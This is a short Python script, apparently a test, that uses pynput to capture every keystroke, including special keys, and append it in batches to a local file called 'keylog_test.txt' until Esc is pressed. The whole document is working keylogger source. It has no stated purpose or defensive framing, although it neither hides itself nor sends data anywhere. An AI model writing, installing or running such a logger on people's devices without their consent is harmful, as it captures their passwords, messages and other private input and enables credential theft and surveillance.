from pynput import keyboard

log_file = "keylog_test.txt"
buffer = []

def on_press(key):
    try:
        buffer.append(key.char)
    except AttributeError:
        buffer.append(f'[{key}]')

    if len(buffer) >= 50:
        with open(log_file, "a") as f:
            f.write("".join(buffer))
        buffer.clear()

def on_release(key):
    if key == keyboard.Key.esc:
        if buffer:
            with open(log_file, "a") as f:
                f.write("".join(buffer))
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
